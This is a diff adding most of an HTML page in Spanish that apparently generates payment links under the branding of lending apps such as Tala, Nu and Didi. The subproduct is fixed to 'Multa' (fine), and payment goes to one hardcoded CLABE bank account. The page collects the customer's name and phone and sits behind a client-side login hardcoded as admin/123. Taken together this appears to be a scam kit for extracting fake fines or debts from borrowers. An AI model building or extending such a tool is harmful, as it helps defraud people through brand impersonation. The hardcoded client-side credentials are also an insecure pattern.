@@ -102,4 +102,126 @@
                     <option value="movil|#8b5cf6|#6d28d9" class="text-black">Movil Cash</option>
                 </select>
             </div>
-            <div id="monto-card-bg" class="monto-box bg-[#0d
+            <div id="monto-card-bg" class="monto-box bg-[#0d9488] text-white shadow-lg">
+                <span class="text-[10px] font-bold opacity-80 uppercase tracking-widest">Monto de Pago</span>
+                <div class="flex items-center mt-1">
+                    <span class="text-3xl font-bold mr-1">$</span>
+                    <input type="number" id="input-monto" oninput="sync()" placeholder="0.00" class="input-monto">
+                </div>
+            </div>
+        </div>
+
+        <div class="p-8 space-y-4">
+            <div class="flex justify-between items-center border-b border-slate-50 pb-2">
+                <span class="text-[11px] font-bold text-slate-400 uppercase">Subproducto</span>
+                <span class="text-sm font-bold text-slate-800">Multa</span>
+            </div>
+            <div class="flex justify-between items-center border-b border-slate-50 pb-2">
+                <span class="text-[11px] font-bold text-slate-400 uppercase">Importe</span>
+                <span id="res-monto" class="text-sm font-bold text-slate-800">$0.00</span>
+            </div>
+            <div class="flex justify-between items-center border-b border-slate-100 pb-2">
+                <span class="text-[11px] font-bold text-slate-400 uppercase">Fecha Vencimiento</span>
+                <input type="date" id="f-venc" onchange="dias()" class="text-sm font-bold text-slate-800 outline-none">
+            </div>
+            <div class="flex justify-between items-center border-b border-slate-100 pb-2">
+                <span class="text-[11px] font-bold text-slate-400 uppercase">Días Vencimiento</span>
+                <span id="res-dias" class="text-sm font-bold text-slate-800">0</span>
+            </div>
+
+            <div class="bg-slate-50 rounded-[2rem] p-5 space-y-4 border border-slate-100">
+                <div class="text-center">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Método de pago</span>
+                    <select id="metodo-pago" class="w-full bg-white border border-slate-200 rounded-xl py-2.5 text-sm font-bold text-center outline-none">
+                        <option value="STP">STP</option>
+                        <option value="BBVA">BBVA</option>
+                    </select>
+                </div>
+                <div class="text-center">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Liga de pago</span>
+                    <select id="clabe-pago" class="w-full bg-white border border-slate-200 rounded-xl py-2.5 text-sm font-bold text-center text-blue-600 outline-none">
+                        <option value="703010052250010635">703010052250010635</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="space-y-4 pt-2">
+                <div class="border-b border-slate-200 flex justify-between items-end pb-1">
+                    <label class="text-[11px] font-bold text-slate-400 uppercase">Nombre del cliente</label>
+                    <input type="text" id="cliente-nombre" placeholder="Nombre" class="text-right text-sm font-bold outline-none w-2/3">
+                </div>
+                <div class="border-b border-slate-200 flex justify-between items-end pb-1">
+                    <label class="text-[11px] font-bold text-slate-400 uppercase">Teléfono</label>
+                    <input type="text" id="cliente-tel" placeholder="Teléfono" class="text-right text-sm font-bold outline-none w-2/3">
+                </div>
+            </div>
+
+            <button onclick="confirmar()" id="btn-main" class="w-full bg-[#0d9488] text-white font-bold py-5 rounded-[1.5rem] shadow-xl uppercase text-xs tracking-widest mt-2 transition-all active:scale-95">GENERAR LINK</button>
+        </div>
+    </div>
+
+    <script>
+        function acceder() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(u === "admin" && p === "123") {
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('login-bg').style.display = 'none';
+                document.getElementById('main-app').style.display = 'block';
+                dias();
+            } else {
+                document.getElementById('login-error').style.display = 'block';
+                setTimeout(() => { document.getElementById('login-error').style.display = 'none'; }, 2000);
+            }
+        }
+
+        const logos = {'tala': 'https://i.ibb.co/qF6Vvqy/tala-te-presta.png','nu': 'https://i.ibb.co/Lzf7vYn/image-45ecfc.png','dida': 'https://i.ibb.co/BccC9Rz/image-46429b.png','worldmox': 'https://i.ibb.co/VvzM47m/image-45e8a1.png','movil': 'https://i.ibb.co/vY8N9zX/image-45e4a2.png'};
+        
+        function updateApp() {
+            const [id, c1, c2] = document.getElementById('product-select').value.split('|');
+            document.getElementById('header-bg').style.backgroundColor = c1;
+            document.getElementById('monto-card-bg').style.backgroundColor = c2;
+            document.getElementById('btn-main').style.backgroundColor = c2;
+            document.getElementById('app-logo').src = logos[id] || logos['tala'];
+        }
+
+        function sync() {
+            let v = document.getElementById('input-monto').value || "0";
+            document.getElementById('res-monto').innerText = "$" + parseFloat(v).toLocaleString('en-US', {minimumFractionDigits: 2});
+        }
+
+        function dias() {
+            let f = document.getElementById('f-venc').value;
+            if(!f) return;
+            let hoy = new Date(); hoy.setHours(0,0,0,0);
+            let venc = new Date(f + 'T00:00:00');
+            let diffDays = Math.ceil((venc.getTime() - hoy.getTime()) / (1000 * 60 * 60 * 24));
+            const d = document.getElementById('res-dias');
+            d.innerText = diffDays;
+            d.style.color = diffDays < 0 ? "#ef4444" : "#1e293b";
+        }
+
+        function confirmar() {
+            const monto = document.getElementById('input-monto').value || "0.00";
+            const nombre = document.getElementById('cliente-nombre').value || "Cliente";
+            const tel = document.getElementById('cliente-tel').value || "";
+            const fecha = document.getElementById('f-venc').value || "";
+            const sel = document.getElementById('product-select');
+            const producto = sel.options[sel.selectedIndex].text;
+            
+            // Envío de datos al link de pago
+            const params = new URLSearchParams({
+                monto: monto,
+                nombre: nombre,
+                tel: tel,
+                fecha: fecha,
+                prod: producto
+            });
+
+            window.location.href = `detalle.html?${params.toString()}`;
+        }
+
+        document.getElementById('f-venc').value = new Date().toISOString().split('T')[0];
+    </script>
+</body>
+</html>
